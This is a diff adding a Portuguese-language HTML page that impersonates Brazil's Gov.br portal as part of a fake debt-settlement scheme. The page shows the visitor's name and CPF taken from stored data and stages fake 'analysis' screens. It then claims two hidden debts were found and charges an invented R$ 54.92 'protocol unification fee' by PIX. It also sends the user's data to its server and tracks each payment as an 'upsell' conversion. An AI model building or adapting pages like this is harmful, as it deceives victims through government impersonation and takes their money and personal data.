@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação Necessária - Gov.br</title>
+    <!-- TikTok Pixel -->
+    <script>
+    !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+    ttq.load('DA9IHQBC77UBPDTVJ18G');
+    ttq.page();
+    }(window,document,'ttq');
+    </script>
+    <script src="/static/js/qrcode.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background-color: #f5f5f5; display: flex; flex-direction: column; font-family: 'Segoe UI', Arial, sans-serif; align-items: center;}
+        
+        .govbr-header { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; max-width: 520px; width: 100%; }
+        .govbr-logo { font-size: 24px; font-weight: 900; color: #1351B4; letter-spacing: -1px; }
+        .govbr-logo span { color: #FFCD07; }
+        .header-icons { display: flex; align-items: center; gap: 14px; }
+        .header-icon-btn { width: 36px; height: 36px; border: 1.5px solid #ccc; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 16px; color: #555; }
+        
+        .main-wrap { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px 0; width: 100%; max-width: 520px;}
+        .card { background: #fff; width: 100%; padding: 32px 28px 28px; display: flex; flex-direction: column; align-items: center; text-align: center; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.05);}
+        
+        .step { display: none; width: 100%; animation: fadeIn 0.4s; }
+        .step.active { display: flex; flex-direction: column; align-items: center; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .title { font-size: 22px; font-weight: 700; color: #1351B4; margin-bottom: 16px; line-height: 1.3; }
+        .subtitle { font-size: 15px; color: #444; margin-bottom: 24px; line-height: 1.5; text-align: left; width: 100%; }
+        
+        .data-box { background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 8px; padding: 16px; width: 100%; text-align: left; margin-bottom: 24px; }
+        .data-item { margin-bottom: 12px; }
+        .data-item:last-child { margin-bottom: 0; }
+        .data-label { font-size: 13px; color: #666; font-weight: 600; text-transform: uppercase; }
+        .data-value { font-size: 16px; color: #1a1a1a; font-weight: 700; }
+
+        .debt-box { background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; padding: 16px; width: 100%; text-align: left; margin-bottom: 16px; }
+        .debt-title { font-weight: 700; color: #856404; font-size: 16px; margin-bottom: 4px;}
+        .debt-value { color: #d32f2f; font-weight: 700; font-size: 15px;}
+        .alert-text { color: #d32f2f; font-weight: 700; margin-bottom: 16px; font-size: 15px;}
+
+        .btn-continuar { width: 100%; background: #1351B4; color: #fff; font-size: 17px; font-weight: 700; border: none; border-radius: 30px; padding: 16px; cursor: pointer; text-align: center; transition: background 0.2s, transform 0.1s; margin-bottom: 20px; display: flex; justify-content: center; align-items: center;}
+        .btn-continuar:hover { background: #0f3e8e; transform: translateY(-1px); }
+        .btn-continuar:active { transform: translateY(0); }
+
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1351B4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 16px; font-weight: 600; color: #1351B4; margin-top: 16px; min-height: 24px;}
+
+        .qr-container { display: flex; flex-direction: column; align-items: center; background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 20px; width: 100%; }
+        .qr-code-img { width: 220px; height: 220px; margin-bottom: 16px; }
+        .pix-code-box { background: #f5f5f5; border: 1px dashed #ccc; padding: 12px; border-radius: 6px; width: 100%; word-break: break-all; font-family: monospace; font-size: 13px; color: #555; margin-bottom: 16px; text-align: left; }
+    </style>
+  <script src="/static/js/pixel-loader.js"></script>
+</head>
+<body>
+    <header class="govbr-header">
+        <img src="/static/images/logo-portal.webp" alt="gov.br" style="height: 35px; width: auto;">
+        <div style="background: #1351B4; color: white; border-radius: 20px; padding: 6px 16px; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+            <span id="header-user-name">Cidadão</span>
+        </div>
+    </header>
+
+    <main class="main-wrap">
+        <div class="card">
+            
+            <!-- STEP 1: VALIDATION -->
+            <div class="step active" id="step1">
+                <h1 class="title">Validação de Dados</h1>
+                <p class="subtitle">Precisamos validar seus dados para ter certeza de que o acordo será gerado corretamente em seu nome.</p>
+                
+                <div class="data-box">
+                    <div class="data-item">
+                        <div class="data-label">NOME COMPLETO</div>
+                        <div class="data-value" id="display-name">Carregando...</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">CPF</div>
+                        <div class="data-value" id="display-cpf">Carregando...</div>
+                    </div>
+                </div>
+
+                <button class="btn-continuar" onclick="nextStep(2)">Confirmar meus dados</button>
+            </div>
+
+            <!-- STEP 2: LOADING 1 -->
+            <div class="step" id="step2">
+                <h1 class="title">Analisando Histórico</h1>
+                <div class="loading-spinner"></div>
+                <div class="loading-text" id="loading-text-1">Buscando pendências...</div>
+            </div>
+
+            <!-- STEP 3: NEW DEBTS FOUND -->
+            <div class="step" id="step3">
+                <h1 class="title">Atenção!</h1>
+                <p class="subtitle">Durante o processo final de quitação, o sistema financeiro encontrou <strong>2 novos débitos vinculados ao seu CPF</strong> que não constavam na primeira base de dados.</p>
+                <p class="alert-text">Não é possível emitir a certidão de quitação e aplicar o desconto de 99% sem incluir essas pendências no acordo central.</p>
+
+                <div class="debt-box" style="background: #fff; border: 1px solid #e0e0e0; border-left: 4px solid #d32f2f;">
+                    <div class="debt-title" style="color: #1a1a1a; display: flex; align-items: center; gap: 8px;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>
+                        Pendência Financeira (Atraso)
+                    </div>
+                    <div class="debt-value" style="color: #666; font-weight: normal; font-size: 14px; margin-top: 4px; padding-left: 26px;">Instituição Emissora Retida</div>
+                </div>
+                <div class="debt-box" style="background: #fff; border: 1px solid #e0e0e0; border-left: 4px solid #d32f2f;">
+                    <div class="debt-title" style="color: #1a1a1a; display: flex; align-items: center; gap: 8px;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>
+                        Contrato de Crédito / Juros
+                    </div>
+                    <div class="debt-value" style="color: #666; font-weight: normal; font-size: 14px; margin-top: 4px; padding-left: 26px;">Instituição Emissora Retida</div>
+                </div>
+
+                <p class="subtitle" style="font-size: 14px;">Você concorda em incluir estas dívidas no pacote de quitação com 99% de desconto?</p>
+                <button class="btn-continuar" onclick="nextStep(4)">Estou de acordo</button>
+            </div>
+
+            <!-- STEP 4: LOADING 2 -->
+            <div class="step" id="step4">
+                <h1 class="title">Reprocessando Acordo</h1>
+                <div class="loading-spinner"></div>
+                <div class="loading-text" id="loading-text-2">Incluindo novas dívidas no sistema...</div>
+            </div>
+
+            <!-- STEP 5: TAX EXPLANATION -->
+            <div class="step" id="step5">
+                <h1 class="title">Atualização de Cadastro</h1>
+                
+                <div style="background: #f0f7f0; border-left: 4px solid #2e7d32; border-radius: 4px; padding: 16px; margin-bottom: 24px; text-align: left; width: 100%;">
+                    <p style="color: #1a1a1a; font-size: 15px; line-height: 1.5; margin-bottom: 8px;"><strong>As 2 pendências ocultas foram adicionadas</strong> ao seu pacote de descontos com sucesso.</p>
+                    <p style="color: #1a1a1a; font-size: 15px; line-height: 1.5;">O seu desconto total de 99% será mantido para todas as dívidas unificadas.</p>
+                </div>
+
+                <p class="subtitle" style="font-size: 15px;">Para concluir a baixa definitiva em todos os sistemas do Serasa e do Banco Central simultaneamente, é necessário gerar um <strong>novo protocolo de unificação</strong>.</p>
+                
+                <div class="data-box" style="text-align: center; background: #fff; border: 2px solid #1351B4; padding: 24px 16px;">
+                    <div class="data-label" style="color: #1351B4;">TARIFA DE UNIFICAÇÃO DE PROTOCOLO</div>
+                    <div class="data-value" style="font-size: 28px; color: #1a1a1a; margin-top: 12px; font-weight: 900;">R$ 54,92</div>
+                    <p style="font-size: 12px; color: #777; margin-top: 8px;">(Pagamento único para emissão da certidão)</p>
+                </div>
+
+                <button class="btn-continuar" id="btn-generate-pix" onclick="generateUpsellPix()" style="margin-top: 8px; font-size: 18px; padding: 18px;">Gerar Guia de R$ 54,92</button>
+            </div>
+
+            <!-- STEP 6: PIX PAYMENT -->
+            <!-- STEP 6: PIX PAYMENT -->
+            <div class="step" id="step6">
+                <h1 class="title">Pagamento da Taxa</h1>
+                <p class="subtitle" style="text-align: center;">Copie o código PIX abaixo ou escaneie o QR Code para concluir a remodelação e limpar seu nome.</p>
+                
+                <div class="qr-container" style="background:#fff; border:1px solid #e0e6ed; border-radius:12px; padding:20px; box-shadow: 0 4px 12px rgba(0,0,0,0.06); margin-bottom:20px;">
+                    <div id="upsell-qr-wrapper" style="display:flex; justify-content:center; align-items:center; min-height:200px; margin-bottom:16px;">
+                        <img id="upsell-qr" class="qr-code-img" src="" alt="QR Code PIX" style="width:200px; height:200px; display:none; object-fit:contain; border-radius:8px;">
+                        <div id="upsell-qr-canvas" style="display:none; width:200px; height:200px;"></div>
+                    </div>
+                    <div class="pix-code-box" id="upsell-pix-code"></div>
+                    <button class="btn-continuar" onclick="copyPix()">Copiar Código PIX</button>
+                </div>
+                
+                <p style="font-size: 13px; color: #666; text-align:center;">Aguardando confirmação do pagamento...</p>
+                <div class="loading-spinner" style="width: 30px; height: 30px; border-width: 3px;"></div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        let userData = {};
+
+        window.onload = function() {
+            try {
+                let jinjaNome = "";
+                let jinjaCpf = "";
+                
+                if (jinjaNome && jinjaNome !== '') {
+                    userData.nome = jinjaNome;
+                }
+                if (jinjaCpf && jinjaCpf !== '') {
+                    userData.cpf = jinjaCpf;
+                }
+
+                const stored = localStorage.getItem('customerData');
+                if(stored) {
+                    const parsed = JSON.parse(stored);
+                    userData.nome = userData.nome || parsed.nome;
+                    userData.cpf = userData.cpf || parsed.cpf;
+                    userData.nascimento = userData.nascimento || parsed.nascimento || '19/05/2003';
+                    userData.telefone = parsed.telefone || parsed.phone || '';
+                }
+            } catch(e) { console.error("Error loading data", e); }
+            
+            document.getElementById('display-name').textContent = userData.nome || 'Não informado';
+            document.getElementById('display-cpf').textContent = userData.cpf || 'Não informado';
+            if (userData.nome) {
+                document.getElementById('header-user-name').textContent = userData.nome.split(' ')[0];
+            }
+        }
+
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+
+            if(step === 2) {
+                const texts = ["Quitando dívidas...", "Buscando histórico oculto...", "Preparando contrato..."];
+                let i = 0;
+                const interval = setInterval(() => {
+                    i++;
+                    if(i >= texts.length) {
+                        clearInterval(interval);
+                        nextStep(3);
+                    } else {
+                        document.getElementById('loading-text-1').textContent = texts[i];
+                    }
+                }, 2000);
+            }
+
+            if(step === 4) {
+                const texts = ["Reprocessando...", "Aplicando 99% de desconto...", "Finalizando..."];
+                let i = 0;
+                const interval = setInterval(() => {
+                    i++;
+                    if(i >= texts.length) {
+                        clearInterval(interval);
+                        nextStep(5);
+                    } else {
+                        document.getElementById('loading-text-2').textContent = texts[i];
+                    }
+                }, 1500);
+            }
+        }
+
+        async function generateUpsellPix() {
+            const btn = document.getElementById('btn-generate-pix');
+            btn.innerHTML = '<div class="loading-spinner" style="width:20px; height:20px; margin:0; border-width:2px; border-top-color:#1351B4; border-color: rgba(255,255,255,0.3) rgba(255,255,255,0.3) rgba(255,255,255,0.3) #fff;"></div> Aguarde...';
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/generate-pix-upsell', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(userData)
+                });
+                const data = await res.json();
+                
+                if(data.success) {
+                    const pixCode = data.pix_code || data.pixCode || '';
+                    let qrSrc = data.qr_code_base64 || data.pixQrCode || '';
+                    if (qrSrc && !qrSrc.startsWith('data:image') && !qrSrc.startsWith('http') && !qrSrc.startsWith('/')) {
+                        qrSrc = 'data:image/png;base64,' + qrSrc;
+                    }
+                    if (!qrSrc && pixCode) {
+                        qrSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+                    }
+
+                    const qrImg = document.getElementById('upsell-qr');
+                    const qrCanvas = document.getElementById('upsell-qr-canvas');
+                    
+                    document.getElementById('upsell-pix-code').textContent = pixCode;
+                    
+                    function renderClientUpsellQr() {
+                        if (window.QRCode && qrCanvas) {
+                            qrCanvas.innerHTML = '';
+                            try {
+                                new QRCode(qrCanvas, {
+                                    text: pixCode,
+                                    width: 200,
+                                    height: 200,
+                                    colorDark: '#000000',
+                                    colorLight: '#ffffff'
+                                });
+                                if (qrImg) qrImg.style.display = 'none';
+                                qrCanvas.style.display = 'block';
+                                return true;
+                            } catch(e) {}
+                        }
+                        return false;
+                    }
+
+                    if (qrImg && qrSrc) {
+                        qrImg.src = qrSrc;
+                        qrImg.style.display = 'block';
+                        qrImg.onload = function() {
+                            qrImg.style.display = 'block';
+                            if (qrCanvas) qrCanvas.style.display = 'none';
+                        };
+                        qrImg.onerror = function() {
+                            if (!renderClientUpsellQr()) {
+                                qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+                                qrImg.style.display = 'block';
+                            }
+                        };
+                    } else {
+                        renderClientUpsellQr();
+                    }
+                    
+                    // Track Upsell Checkout
+                    try {
+                        ttq.track('InitiateCheckout', {
+                            value: 54.92,
+                            currency: 'BRL',
+                            content_name: 'Upsell_Remodelacao'
+                        });
+                    } catch(e) {}
+
+                    nextStep(6);
+                    window._pixTransactionId = data.transaction_id || data.transactionId || data.gateway_id;
+                    pollPayment(window._pixTransactionId);
+                } else {
+                    alert("Erro ao gerar PIX: " + (data.error || "Tente novamente."));
+                    btn.innerHTML = 'Gerar Guia de R$ 54,92';
+                    btn.disabled = false;
+                }
+            } catch(e) {
+                alert("Erro de conexão. Tente novamente.");
+                btn.innerHTML = 'Gerar Guia de R$ 54,92';
+                btn.disabled = false;
+            }
+        }
+
+        function copyPix() {
+            const code = document.getElementById('upsell-pix-code').textContent;
+            (function(txId) {
+                if (!txId) return;
+                try {
+                    fetch('/api/pix-copied', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ transactionId: txId })
+                    }).catch(function() {});
+                } catch(e) {}
+            })(window._pixTransactionId);
+            navigator.clipboard.writeText(code).then(() => {
+                alert("Código PIX copiado com sucesso!");
+            });
+        }
+
+        async function pollPayment(transactionId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`/check-payment/${transactionId}`);
+                    const data = await res.json();
+                    if(data.success && (data.status === 'approved' || data.status === 'paid' || data.status === 'pago')) {
+                        clearInterval(interval);
+                        
+                        try {
+                            ttq.track('Purchase', {
+                                value: 54.92,
+                                currency: 'BRL',
+                                content_name: 'Upsell_Remodelacao'
+                            });
+                        } catch(e) {}
+                        
+                        setTimeout(() => {
+                            window.location.href = '/negociacao'; // Final destination after upsell
+                        }, 3000);
+                    }
+                } catch (e) {
+                    console.error("Polling error:", e);
+                }
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
